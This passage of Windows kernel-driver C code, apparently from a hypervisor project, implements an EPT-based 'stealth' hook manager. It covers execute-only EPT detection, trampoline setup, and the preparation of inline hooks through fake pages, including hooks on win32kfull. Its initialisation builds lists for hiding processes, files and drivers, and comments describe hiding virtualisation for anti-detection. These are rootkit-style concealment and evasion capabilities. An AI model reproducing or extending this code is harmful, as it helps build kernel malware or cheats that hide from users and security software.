 *    （因为 CPUID VMX 位可能被反检测隐藏）
 * 2. 读取 IA32_VMX_EPT_VPID_CAP MSR (Bit 0)
 * 3. 根据 CPU 型号推断（Haswell+ 支持）
 */
static BOOLEAN
EptIsExecuteOnlySupported(VOID)
{
    int cpuInfo[4];
    ULONG64 eptVpidCap = 0;
    ULONG family, model;
    BOOLEAN isIntel = FALSE;
    char vendorString[13] = { 0 };
    
    // 首先检查是否是 Intel CPU
    __cpuid(cpuInfo, 0);
    *(int*)&vendorString[0] = cpuInfo[1];  // EBX
    *(int*)&vendorString[4] = cpuInfo[3];  // EDX
    *(int*)&vendorString[8] = cpuInfo[2];  // ECX
    
    isIntel = (vendorString[0] == 'G' && vendorString[1] == 'e' && 
               vendorString[2] == 'n' && vendorString[3] == 'u' &&
               vendorString[4] == 'i' && vendorString[5] == 'n' &&
               vendorString[6] == 'e' && vendorString[7] == 'I' &&
               vendorString[8] == 'n' && vendorString[9] == 't' &&
               vendorString[10] == 'e' && vendorString[11] == 'l');
    
    if (!isIntel) {
        DbgPrint("[EPT-Hook] ERROR: Not Intel CPU, Execute-Only not available\n");
        return FALSE;
    }
    
    // 获取 CPU 家族和型号
    __cpuid(cpuInfo, 1);
    family = ((cpuInfo[0] >> 8) & 0xF) + ((cpuInfo[0] >> 20) & 0xFF);
    model = ((cpuInfo[0] >> 4) & 0xF) | ((cpuInfo[0] >> 12) & 0xF0);
    
    DbgPrint("[EPT-Hook] Intel CPU: Family=%d, Model=%d\n", family, model);
    
    // 方法 1：如果 Hypervisor 已激活，EPT 正在工作
    // 注意：在 Guest 模式下 CPUID 的 VMX 位可能被隐藏（反检测）
    // 所以不能依赖 CPUID 检查 VMX，而是信任 Hypervisor 状态
    if (g_HypervisorContext.IsActive) {
        DbgPrint("[EPT-Hook] Hypervisor is active, checking CPU model for Execute-Only...\n");
        
        // 现代 Intel CPU（Haswell 2013+ Model >= 60）支持 Execute-Only
        // i5-12400F 是 Alder Lake (Model 0x97 = 151)，肯定支持
        if (family == 6 && model >= 60) {
            DbgPrint("[EPT-Hook] Modern CPU (Family 6, Model %d >= 60) supports Execute-Only\n", model);
            return TRUE;
        }
        
        // 对于较旧的 CPU，尝试读取 MSR 确认
        __try {
            eptVpidCap = __readmsr(0x48C);  // IA32_VMX_EPT_VPID_CAP
            if (eptVpidCap & 1ULL) {
                DbgPrint("[EPT-Hook] MSR confirms Execute-Only support (cap=0x%llx)\n", eptVpidCap);
                return TRUE;
            }
            DbgPrint("[EPT-Hook] MSR: Execute-Only NOT supported (cap=0x%llx)\n", eptVpidCap);
            return FALSE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // MSR 读取失败，但 Hypervisor 激活意味着 VMX 工作正常
            // 信任 CPU 型号判断
            DbgPrint("[EPT-Hook] MSR read failed, trusting CPU model heuristic\n");
            if (family == 6 && model >= 60) {
                return TRUE;
            }
            return FALSE;
        }
    }
    
    // 方法 2：Hypervisor 未激活，检查 CPUID VMX 位
    if (!(cpuInfo[2] & (1 << 5))) {  // ECX bit 5 = VMX support
        DbgPrint("[EPT-Hook] ERROR: CPU does not support VMX (CPUID)\n");
        return FALSE;
    }
    
    // 方法 3：读取 IA32_VMX_EPT_VPID_CAP MSR
    __try {
        eptVpidCap = __readmsr(0x48C);  // IA32_VMX_EPT_VPID_CAP
        
        // Bit 0: Execute-only translations support
        if (eptVpidCap & 1ULL) {
            DbgPrint("[EPT-Hook] MSR confirms Execute-Only support (cap=0x%llx)\n", eptVpidCap);
            return TRUE;
        }
        
        DbgPrint("[EPT-Hook] MSR: Execute-Only NOT supported (cap=0x%llx)\n", eptVpidCap);
        return FALSE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[EPT-Hook] MSR read exception, using CPU model heuristic...\n");
    }
    
    // 方法 4：根据 CPU 型号推断（Haswell+ 支持）
    if (family == 6 && model >= 60) {
        DbgPrint("[EPT-Hook] CPU model indicates Execute-Only support (Haswell+)\n");
        return TRUE;
    }
    
    DbgPrint("[EPT-Hook] ERROR: Execute-Only EPT not supported on this CPU\n");
    return FALSE;
}

NTSTATUS
EptHookInitialize(VOID)
{
    PHYSICAL_ADDRESS maxAddr;
    
    if (g_EptHookManager.Initialized) {
        return STATUS_SUCCESS;
    }
    
    DbgPrint("[EPT-Hook] Initializing EPT Hook Manager...\n");
    
    // 初始化链表
    InitializeListHead(&g_EptHookManager.HookList);
    g_EptHookManager.HookCount = 0;
    InitializeListHead(&g_EptHookManager.RetiredHookList);
    g_EptHookManager.RetiredHookCount = 0;
    InitializeListHead(&g_EptHookManager.PageList);
    g_EptHookManager.PageCount = 0;
    InitializeListHead(&g_EptHookManager.RetiredPageList);
    g_EptHookManager.RetiredPageCount = 0;
    
    // 初始化自旋锁
    KeInitializeSpinLock(&g_EptHookManager.Lock);
    ExInitializeFastMutex(&g_EptHookManager.MutationMutex);
    InterlockedExchange(&g_EptHookManager.RootEpoch, 0);
    InterlockedExchange(&g_EptHookManager.RootReaders[0], 0);
    InterlockedExchange(&g_EptHookManager.RootReaders[1], 0);
    
    // 初始化隐藏进程列表
    KeInitializeSpinLock(&g_HiddenProcessLock);
    g_HiddenProcessCount = 0;
    RtlZeroMemory(g_HiddenProcessIds, sizeof(g_HiddenProcessIds));
    
    // 初始化文件隐藏锁和驱动隐藏锁（提前初始化以避免运行时竞态条件）
    KeInitializeSpinLock(&g_HiddenFileLock);
    InterlockedExchange(&g_HiddenFileLockInitialized, TRUE);
    g_HiddenFileCount = 0;
    RtlZeroMemory(g_HiddenFileNames, sizeof(g_HiddenFileNames));
    
    KeInitializeSpinLock(&g_HiddenDriverLock);
    InterlockedExchange(&g_HiddenDriverLockInitialized, TRUE);
    g_HiddenDriverCount = 0;
    RtlZeroMemory(g_HiddenDriverNames, sizeof(g_HiddenDriverNames));
    RtlZeroMemory(g_HiddenDriverServiceNames, sizeof(g_HiddenDriverServiceNames));
    RtlZeroMemory(g_HiddenDriverBases, sizeof(g_HiddenDriverBases));
    RtlZeroMemory(g_HiddenDriverSizes, sizeof(g_HiddenDriverSizes));
    
    // 检查 Execute-Only EPT 支持（必需）
    g_EptHookManager.ExecuteOnlySupported = EptIsExecuteOnlySupported();
    DbgPrint("[EPT-Hook] Execute-Only EPT support: %s\n",
        g_EptHookManager.ExecuteOnlySupported ? "YES" : "NO");
    
    if (!g_EptHookManager.ExecuteOnlySupported) {
        DbgPrint("[EPT-Hook] ERROR: Execute-Only EPT not supported!\n");
        DbgPrint("[EPT-Hook] This CPU cannot run stealth EPT hooks.\n");
        // 继续初始化，但 Hook 安装时会失败
    }
    
    // 初始化 MTF 上下文数组
    RtlZeroMemory(g_EptHookManager.MtfContext, sizeof(g_EptHookManager.MtfContext));
    
    // 2026-06-19 方案 C: 用 driver image 内嵌的静态可执行 section, 替代
    // ExAllocatePool2(NonPagedExecute)。
    // 旧方案池在 NonPaged pool (0xFFFFA...~0xFFFFC...) 距 kernel module (0xFFFFF8...)
    // > 2 GB, RIP-relative disp32 重定位溢出, 阻挡 hook win32kfull 含 RIP-rel 的函数。
    // 静态数组随 driver image 加载, 在 0xFFFFF8... 区, 距 win32kfull.sys < 2 GB。
    g_EptHookManager.TrampolinePool = (PVOID)g_StaticTrampolinePool;

    // 2026-05-21 BSOD 0x1E (0xC0000096) 防御:
    //   不要 ZeroMemory(0x00 = ADD [RAX],AL = 任意 stray jump 立即 AV)。
    //   用 INT3 (0xCC) 填充整个池,任何越界控制流 → #BP → 受控蓝屏带 dump,
    //   而不是踩到相邻 trampoline 残留字节。
    RtlFillMemory(g_EptHookManager.TrampolinePool, sizeof(g_StaticTrampolinePool), 0xCC);
    g_EptHookManager.TrampolinePoolPhysical =
        MmGetPhysicalAddress(g_EptHookManager.TrampolinePool).QuadPart;
    g_EptHookManager.TrampolinePoolUsed = 0;

    DbgPrint("[EPT-Hook] Trampoline Pool (static .HVTRAMP section) VA=%p PA=0x%llx (INT3 fill)\n",
             g_EptHookManager.TrampolinePool, g_EptHookManager.TrampolinePoolPhysical);
    
    g_EptHookManager.Initialized = TRUE;
    
    DbgPrint("[EPT-Hook] EPT Hook Manager initialized successfully\n");
    DbgPrint("[EPT-Hook] Trampoline Pool: VA=%p PA=0x%llx\n",
        g_EptHookManager.TrampolinePool,
        g_EptHookManager.TrampolinePoolPhysical);
    
    // 打印 EPT 结构信息
    EptPrintInfo();
    
    return STATUS_SUCCESS;
}

VOID
EptHookCleanup(VOID)
{
    KIRQL oldIrql;
    PVOID trampolinePool = NULL;
    PLIST_ENTRY retiredLink;
    PEPT_HOOK_ENTRY retiredEntry;
    PEPT_HOOK_PAGE retiredPage;
    
    if (!g_EptHookManager.Initialized) {
        return;
    }
    
    DbgPrint("[EPT-Hook] Cleaning up EPT Hook Manager...\n");
    
    // 移除所有 Hook
    EptHookRemoveAll();
    if (g_EptHookManager.HookCount != 0 ||
        g_EptHookManager.PageCount != 0) {
        DbgPrint("[EPT-Hook] Cleanup retained %lu hook(s), %lu page(s); manager stays initialized\n",
                 g_EptHookManager.HookCount,
                 g_EptHookManager.PageCount);
        return;
    }

    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);
    if (g_EptHookManager.HookCount != 0 ||
        g_EptHookManager.PageCount != 0) {
        DbgPrint("[EPT-Hook] Cleanup raced a new prepared/active hook; manager stays initialized\n");
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
        return;
    }
    for (;;) {
        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        if (IsListEmpty(&g_EptHookManager.RetiredHookList)) {
            KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
            break;
        }
        retiredLink = RemoveHeadList(&g_EptHookManager.RetiredHookList);
        if (g_EptHookManager.RetiredHookCount != 0) {
            g_EptHookManager.RetiredHookCount--;
        }
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

        retiredEntry = CONTAINING_RECORD(
            retiredLink, EPT_HOOK_ENTRY, ListEntry);
        ExFreePoolWithTag(retiredEntry, EPT_HOOK_TAG);
    }
    for (;;) {
        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        if (IsListEmpty(&g_EptHookManager.RetiredPageList)) {
            KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
            break;
        }
        retiredLink = RemoveHeadList(&g_EptHookManager.RetiredPageList);
        if (g_EptHookManager.RetiredPageCount != 0) {
            g_EptHookManager.RetiredPageCount--;
        }
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

        retiredPage = CONTAINING_RECORD(
            retiredLink, EPT_HOOK_PAGE, ListEntry);
        if (retiredPage->FakePageVirtual) {
            MmFreeContiguousMemory(retiredPage->FakePageVirtual);
        }
        ExFreePoolWithTag(retiredPage, EPT_HOOK_PAGE_TAG);
    }

    // 获取跳板池指针（在 SpinLock 保护下）
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    
    trampolinePool = g_EptHookManager.TrampolinePool;
    g_EptHookManager.TrampolinePool = NULL;
    g_EptHookManager.Initialized = FALSE;
    
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
    
    // 2026-06-19 方案 C: trampoline pool 是 driver image 内嵌静态数组,
    // 不需要 ExFreePool, 随 driver 卸载一起释放。仅清空指针。
    UNREFERENCED_PARAMETER(trampolinePool);

    ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    DbgPrint("[EPT-Hook] EPT Hook Manager cleaned up\n");
}

// ============================================================
// Hook 安装
// ============================================================

#if 0 /* superseded by composite page-owner implementation below */
NTSTATUS
EptHookPrepare(
    _In_ PVOID TargetAddress,
    _In_ PVOID HookFunction,
    _Out_ PEPT_HOOK_ENTRY* OutHookEntry,
    _Out_ PVOID* OutTrampoline
)
{
    NTSTATUS status;
    PEPT_HOOK_ENTRY hookEntry = NULL;
    PHYSICAL_ADDRESS targetPa;
    KIRQL oldIrql;
    
    if (!OutHookEntry || !OutTrampoline) {
        return STATUS_INVALID_PARAMETER;
    }
    *OutHookEntry = NULL;
    *OutTrampoline = NULL;

    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (!g_EptHookManager.Initialized) {
        DbgPrint("[EPT-Hook] Hook Manager not initialized\n");
        return STATUS_UNSUCCESSFUL;
    }

    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);
    __try {
    if (!g_EptHookManager.Initialized) {
        DbgPrint("[EPT-Hook] Hook Manager not initialized\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    if (!TargetAddress || !HookFunction) {
        return STATUS_INVALID_PARAMETER;
    }

    if (!g_EptHookManager.ExecuteOnlySupported) {
        DbgPrint("[EPT-Hook] ERROR: Execute-Only EPT not supported, cannot install hook!\n");
        return STATUS_NOT_SUPPORTED;
    }
    
    // 检查是否已经 Hook 过
    if (EptHookFindByVirtualAddress(TargetAddress)) {
        DbgPrint("[EPT-Hook] Address %p already hooked\n", TargetAddress);
        return STATUS_ALREADY_REGISTERED;
    }
    
    // 检查 Hook 数量限制
    if (g_EptHookManager.HookCount >= MAX_EPT_HOOKS) {
        DbgPrint("[EPT-Hook] Maximum hooks reached\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    DbgPrint("[EPT-Hook] Installing hook at %p -> %p\n", TargetAddress, HookFunction);
    
    // 分配 Hook 条目
    hookEntry = (PEPT_HOOK_ENTRY)HvAllocateNonPagedZeroed(
        sizeof(EPT_HOOK_ENTRY),
        EPT_HOOK_TAG
    );
    
    if (!hookEntry) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    RtlZeroMemory(hookEntry, sizeof(EPT_HOOK_ENTRY));
    
    // 获取目标物理地址
    targetPa = MmGetPhysicalAddress(TargetAddress);
    if (targetPa.QuadPart == 0) {
        DbgPrint("[EPT-Hook] Failed to get physical address for %p\n", TargetAddress);
        ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
        return STATUS_INVALID_ADDRESS;
    }
    
    // 填充 Hook 条目
    hookEntry->TargetVirtualAddress = TargetAddress;
    hookEntry->TargetPhysicalAddress = targetPa.QuadPart & PAGE_MASK;
    hookEntry->OffsetInPage = (ULONG)(targetPa.QuadPart & 0xFFF);
    hookEntry->HookFunction = HookFunction;
    hookEntry->Type = EptHookTypeInline;
    hookEntry->State = EptHookStatePrepared;

    /* One EPT leaf owns one GPA page. A second entry for the same target
     * page would publish a different fake PFN and make VM-exit lookup/removal
     * operate on whichever list entry happens to be found first. Reject it
     * before creating per-CPU PTE state or any hook-owned page. */
    {
        BOOLEAN pageConflict = FALSE;
        BOOLEAN sameVaConflict = FALSE;
        PVOID existingVa = NULL;
        ULONG64 existingGpa = 0;
        PLIST_ENTRY existingLink;

        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        for (existingLink = g_EptHookManager.HookList.Flink;
             existingLink != &g_EptHookManager.HookList;
             existingLink = existingLink->Flink) {
            PEPT_HOOK_ENTRY existing = CONTAINING_RECORD(
                existingLink, EPT_HOOK_ENTRY, ListEntry);
            if (existing->TargetPhysicalAddress ==
                hookEntry->TargetPhysicalAddress) {
                pageConflict = TRUE;
                sameVaConflict =
                    (existing->TargetVirtualAddress == TargetAddress);
                existingVa = existing->TargetVirtualAddress;
                existingGpa = existing->TargetPhysicalAddress;
                break;
            }
        }
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

        if (pageConflict) {
            if (sameVaConflict) {
                DbgPrint("[EPT-Hook] Address %p already hooked\n",
                         TargetAddress);
                ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
                return STATUS_ALREADY_REGISTERED;
            }
            DbgPrint("[EPT-Hook] Target GPA page conflict: existing VA=%p GPA=0x%llx, new VA=%p GPA=0x%llx\n",
                     existingVa,
                     existingGpa,
                     hookEntry->TargetVirtualAddress,
                     hookEntry->TargetPhysicalAddress);
            ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
            return STATUS_CONFLICTING_ADDRESSES;
        }
    }
    
    /* Prepare is deliberately SLAT-pure.  Per-CPU leaf discovery and any
     * semantics-preserving 2 MB split are deferred to EptHookActivate, after
     * the owner has published both this handle and the trampoline. */

    // 打印目标函数的前 32 字节用于诊断
    {
        PUCHAR funcBytes = (PUCHAR)TargetAddress;
        DbgPrint("[EPT-Hook] Target function bytes:\n");
        DbgPrint("[EPT-Hook]   %02X %02X %02X %02X %02X %02X %02X %02X\n",
            funcBytes[0], funcBytes[1], funcBytes[2], funcBytes[3],
            funcBytes[4], funcBytes[5], funcBytes[6], funcBytes[7]);
        DbgPrint("[EPT-Hook]   %02X %02X %02X %02X %02X %02X %02X %02X\n",
            funcBytes[8], funcBytes[9], funcBytes[10], funcBytes[11],
            funcBytes[12], funcBytes[13], funcBytes[14], funcBytes[15]);
        DbgPrint("[EPT-Hook]   %02X %02X %02X %02X %02X %02X %02X %02X\n",
            funcBytes[16], funcBytes[17], funcBytes[18], funcBytes[19],
            funcBytes[20], funcBytes[21], funcBytes[22], funcBytes[23]);
    }
    
#if EPT_HOOK_SIMPLE_MODE
    // 简单模式：固定使用 JMP_SIZE (14) 字节
    {
        PUCHAR bytes = (PUCHAR)TargetAddress;
        ULONG i;
        BOOLEAN hasRelInst = FALSE;
        
        DbgPrint("[EPT-Hook] SIMPLE_MODE: Using fixed %d bytes\n", JMP_SIZE);
        RtlCopyMemory(hookEntry->OriginalBytes, TargetAddress, JMP_SIZE);
        hookEntry->OriginalBytesLength = JMP_SIZE;
        
        // 检测是否有需要重定位的指令
        for (i = 0; i < JMP_SIZE - 4; i++) {
            if (bytes[i] == 0xE8 || bytes[i] == 0xE9) {
                DbgPrint("[EPT-Hook] WARNING: Found CALL/JMP (0x%02X) at offset %d - may cause crash!\n", 
                    bytes[i], i);
                hasRelInst = TRUE;
            }
        }
        if (hasRelInst) {
            DbgPrint("[EPT-Hook] Consider enabling full mode (EPT_HOOK_SIMPLE_MODE=0)\n");
        }
    }
#else
    // 完整模式：使用指令长度解码器计算需要复制的字节数
    {
        ULONG bytesToCopy = CalculateTrampolineSize((PUCHAR)TargetAddress, JMP_SIZE);

        DbgPrint("[EPT-Hook] Instruction decoder returned: %d bytes\n", bytesToCopy);

        // 严格拒装:
        //   - bytesToCopy < JMP_SIZE → 跳板调原函数会从指令中间执行 → 必崩
        //   - bytesToCopy > 32       → 超出 OriginalBytes[32] 缓冲,溢出
        // 旧实现遇到这两种情况会 fallback 到 JMP_SIZE,这正是切到指令中间的根因。
        if (bytesToCopy < JMP_SIZE || bytesToCopy > sizeof(hookEntry->OriginalBytes)) {
            DbgPrint("[EPT-Hook] Refusing to install: unsafe trampoline size %d (need %d..%llu)\n",
                     bytesToCopy, (int)JMP_SIZE, (ULONG64)sizeof(hookEntry->OriginalBytes));
            ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
            return STATUS_INVALID_PARAMETER;
        }

        // 保存原始字节
        RtlCopyMemory(hookEntry->OriginalBytes, TargetAddress, bytesToCopy);
        hookEntry->OriginalBytesLength = bytesToCopy;

        DbgPrint("[EPT-Hook] Copying %d bytes for trampoline (min needed: %d)\n", bytesToCopy, JMP_SIZE);
    }
#endif
    
    // 创建伪造页
    status = EptCreateFakePage(hookEntry);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[EPT-Hook] Failed to create fake page: 0x%X\n", status);
        ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
        return status;
    }

    // 2026-06-16: 创建跳板 + 加入链表 — 整体进 spinlock 保护。
    // EptCreateTrampoline 内部 bump TrampolinePoolUsed 之前没锁,多个 hook 并发装载时会 race。
    // 移到锁内同时保证 (a) trampoline 槽位分配原子 (b) 链表插入与槽位分配作为一个完整事务。
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    for (PLIST_ENTRY existingLink = g_EptHookManager.HookList.Flink;
         existingLink != &g_EptHookManager.HookList;
         existingLink = existingLink->Flink) {
        PEPT_HOOK_ENTRY existing = CONTAINING_RECORD(
            existingLink, EPT_HOOK_ENTRY, ListEntry);
        if (existing->TargetVirtualAddress == TargetAddress) {
            KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
            MmFreeContiguousMemory(hookEntry->FakePageVirtual);
            ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
            return STATUS_ALREADY_REGISTERED;
        }
        if (existing->TargetPhysicalAddress ==
            hookEntry->TargetPhysicalAddress) {
            PVOID existingVa = existing->TargetVirtualAddress;
            ULONG64 existingGpa = existing->TargetPhysicalAddress;

            KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
            DbgPrint("[EPT-Hook] Target GPA page conflict at publish: existing VA=%p GPA=0x%llx, new VA=%p GPA=0x%llx\n",
                     existingVa,
                     existingGpa,
                     hookEntry->TargetVirtualAddress,
                     hookEntry->TargetPhysicalAddress);
            MmFreeContiguousMemory(hookEntry->FakePageVirtual);
            ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
            return STATUS_CONFLICTING_ADDRESSES;
        }
    }
    status = EptCreateTrampoline(hookEntry);
    if (!NT_SUCCESS(status)) {
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
        DbgPrint("[EPT-Hook] Failed to create trampoline: 0x%X\n", status);
        if (hookEntry->FakePageVirtual) {
            MmFreeContiguousMemory(hookEntry->FakePageVirtual);
        }
        ExFreePoolWithTag(hookEntry, EPT_HOOK_TAG);
        return status;
    }
    InsertTailList(&g_EptHookManager.HookList, &hookEntry->ListEntry);
    g_EptHookManager.HookCount++;
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

    /* No EPT PDE/PTE has been touched.  Publish both outputs before the
     * caller can invoke EptHookActivate. */
    MemoryBarrier();
    *OutTrampoline = hookEntry->TrampolineAddress;
    *OutHookEntry = hookEntry;

    DbgPrint("[EPT-Hook] Hook prepared successfully\n");
    DbgPrint("[EPT-Hook]   Target VA: %p\n", hookEntry->TargetVirtualAddress);
    DbgPrint("[EPT-Hook]   Target PA: 0x%llx\n", hookEntry->TargetPhysicalAddress);
    DbgPrint("[EPT-Hook]   Fake Page: %p (PA: 0x%llx)\n",
        hookEntry->FakePageVirtual, hookEntry->FakePagePhysical);
    DbgPrint("[EPT-Hook]   Trampoline: %p\n", hookEntry->TrampolineAddress);
    
    return STATUS_SUCCESS;
    }
    __finally {
        ExReleaseFastMutex(&g_EptHookManager.MutationMutex);
    }
}
#endif

static PEPT_HOOK_PAGE
EptHookpFindPageByGpaLocked(_In_ ULONG64 PagePhysical)
{
    PLIST_ENTRY link;

    for (link = g_EptHookManager.PageList.Flink;
         link != &g_EptHookManager.PageList;
         link = link->Flink) {
        PEPT_HOOK_PAGE page = CONTAINING_RECORD(
            link, EPT_HOOK_PAGE, ListEntry);
        if (page->TargetPhysicalAddress == (PagePhysical & PAGE_MASK)) {
            return page;
        }
    }
    return NULL;
}

static __forceinline BOOLEAN
EptHookpPatchRangesOverlap(
    _In_ ULONG FirstOffset,
    _In_ ULONG FirstLength,
    _In_ ULONG SecondOffset,
    _In_ ULONG SecondLength)
{
    return FirstOffset < SecondOffset + SecondLength &&
           SecondOffset < FirstOffset + FirstLength;
}

static VOID
EptHookpBuildPatch(_Inout_ PEPT_HOOK_ENTRY HookEntry)
{
    PVOID destination = HookEntry->HookFunction;

    RtlCopyMemory(HookEntry->PatchBytes, JmpTemplate, 6);
    RtlCopyMemory(
        HookEntry->PatchBytes + 6,
        &destination,
        sizeof(destination));
}

/*
 * Rebuild, rather than incrementally editing, the composite image while its
 * owner is not reachable through EPT.  This also removes any staged patch
 * that was placed in a newly allocated fake page by legacy allocation code.
 */
static VOID
EptHookpRebuildCompositePage(
    _Inout_ PEPT_HOOK_PAGE Page,
    _In_opt_ PEPT_HOOK_ENTRY IncludePrepared,
    _In_opt_ PEPT_HOOK_ENTRY ExcludeActive)
{
    PLIST_ENTRY link;

    RtlCopyMemory(
        Page->FakePageVirtual,
        Page->TargetPageVirtual,
        PAGE_SIZE_4KB);
    for (link = g_EptHookManager.HookList.Flink;
         link != &g_EptHookManager.HookList;
         link = link->Flink) {
        PEPT_HOOK_ENTRY site = CONTAINING_RECORD(
            link, EPT_HOOK_ENTRY, ListEntry);
        if (site->PageOwner != Page ||
            site == ExcludeActive ||
            site->State != EptHookStateActive) {
            continue;
        }
        RtlCopyMemory(
            (PUCHAR)Page->FakePageVirtual + site->OffsetInPage,
            site->PatchBytes,
            EPT_HOOK_PATCH_SIZE);
        site->PatchInstalled = TRUE;
    }
    if (IncludePrepared && IncludePrepared != ExcludeActive) {
        RtlCopyMemory(
            (PUCHAR)Page->FakePageVirtual + IncludePrepared->OffsetInPage,
            IncludePrepared->PatchBytes,
            EPT_HOOK_PATCH_SIZE);
        IncludePrepared->PatchInstalled = TRUE;
    }
    if (ExcludeActive) {
        ExcludeActive->PatchInstalled = FALSE;
    }
    MemoryBarrier();
}

NTSTATUS
EptHookPrepare(
    _In_ PVOID TargetAddress,
    _In_ PVOID HookFunction,
    _Out_ PEPT_HOOK_ENTRY* OutHookEntry,
    _Out_ PVOID* OutTrampoline)
{
    NTSTATUS status = STATUS_SUCCESS;
    PEPT_HOOK_ENTRY hookEntry = NULL;
    PEPT_HOOK_PAGE page = NULL;
    BOOLEAN newPage = FALSE;
    PHYSICAL_ADDRESS targetPa;
    KIRQL oldIrql;
    ULONG bytesToCopy;
    PLIST_ENTRY link;

    if (!OutHookEntry || !OutTrampoline) {
        return STATUS_INVALID_PARAMETER;
    }
    *OutHookEntry = NULL;
    *OutTrampoline = NULL;
    if (KeGetCurrentIrql() > APC_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    if (!TargetAddress || !HookFunction) {
        return STATUS_INVALID_PARAMETER;
    }
    if (!g_EptHookManager.Initialized) {
        return STATUS_NOT_INITIALIZED;
    }

    ExAcquireFastMutex(&g_EptHookManager.MutationMutex);
    __try {
        if (!g_EptHookManager.Initialized) {
            return STATUS_NOT_INITIALIZED;
        }
        if (!g_EptHookManager.ExecuteOnlySupported) {
            return STATUS_NOT_SUPPORTED;
        }
        if (g_EptHookManager.HookCount >= MAX_EPT_HOOKS) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        targetPa = MmGetPhysicalAddress(TargetAddress);
        if (targetPa.QuadPart == 0) {
            return STATUS_INVALID_ADDRESS;
        }

        hookEntry = (PEPT_HOOK_ENTRY)HvAllocateNonPagedZeroed(
            sizeof(EPT_HOOK_ENTRY), EPT_HOOK_TAG);
        if (!hookEntry) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        hookEntry->TargetVirtualAddress = TargetAddress;
        hookEntry->TargetPhysicalAddress = targetPa.QuadPart & PAGE_MASK;
        hookEntry->OffsetInPage = (ULONG)(targetPa.QuadPart & 0xFFF);
        hookEntry->HookFunction = HookFunction;
        hookEntry->Type = EptHookTypeInline;
        hookEntry->State = EptHookStatePrepared;

#if EPT_HOOK_SIMPLE_MODE
        bytesToCopy = EPT_HOOK_PATCH_SIZE;
#else
        bytesToCopy = CalculateTrampolineSize(
            (PUCHAR)TargetAddress, EPT_HOOK_PATCH_SIZE);
#endif
        if (bytesToCopy < EPT_HOOK_PATCH_SIZE ||
            bytesToCopy > sizeof(hookEntry->OriginalBytes) ||
            hookEntry->OffsetInPage + bytesToCopy > PAGE_SIZE_4KB ||
            hookEntry->OffsetInPage + EPT_HOOK_PATCH_SIZE > PAGE_SIZE_4KB) {
            status = STATUS_INVALID_PARAMETER;
            goto Failure;
        }
        RtlCopyMemory(
            hookEntry->OriginalBytes, TargetAddress, bytesToCopy);
        hookEntry->OriginalBytesLength = bytesToCopy;
        EptHookpBuildPatch(hookEntry);

        KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
        for (link = g_EptHookManager.HookList.Flink;
             link != &g_EptHookManager.HookList;
             link = link->Flink) {
            PEPT_HOOK_ENTRY existing = CONTAINING_RECORD(
                link, EPT_HOOK_ENTRY, ListEntry);
            if (existing->TargetVirtualAddress == TargetAddress) {
                KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
                status = STATUS_ALREADY_REGISTERED;
                goto Failure;
            }
            if (existing->TargetPhysicalAddress ==
                    hookEntry->TargetPhysicalAddress &&
                EptHookpPatchRangesOverlap(
                    existing->OffsetInPage,
                    existing->OriginalBytesLength,
                    hookEntry->OffsetInPage,
                    hookEntry->OriginalBytesLength)) {
                KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
                status = STATUS_CONFLICTING_ADDRESSES;
                goto Failure;
            }
        }
        page = EptHookpFindPageByGpaLocked(
            hookEntry->TargetPhysicalAddress);
        KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);

        if (page) {
            if (page->State == EptHookStateQuiescing ||
                page->State == EptHookStateRetired) {
                status = STATUS_DEVICE_BUSY;
                goto Failure;
            }
            if (page->TargetPageVirtual !=
                (PVOID)((ULONG_PTR)TargetAddress & PAGE_MASK)) {
                status = STATUS_CONFLICTING_ADDRESSES;
                goto Failure;
            }
        } else {
            page = (PEPT_HOOK_PAGE)HvAllocateNonPagedZeroed(
                sizeof(EPT_HOOK_PAGE), EPT_HOOK_PAGE_TAG);
            if (!page) {
                status = STATUS_INSUFFICIENT_RESOURCES;
                goto Failure;
            }
            newPage = TRUE;
            page->State = EptHookStatePrepared;
            page->TargetPhysicalAddress =
                hookEntry->TargetPhysicalAddress;
            page->TargetPageVirtual =
                (PVOID)((ULONG_PTR)TargetAddress & PAGE_MASK);

            status = EptCreateFakePage(hookEntry);
            if (!NT_SUCCESS(status)) {
                goto Failure;
            }
            page->FakePageVirtual = hookEntry->FakePageVirtual;
            page->FakePagePhysical = hookEntry->FakePagePhysical;
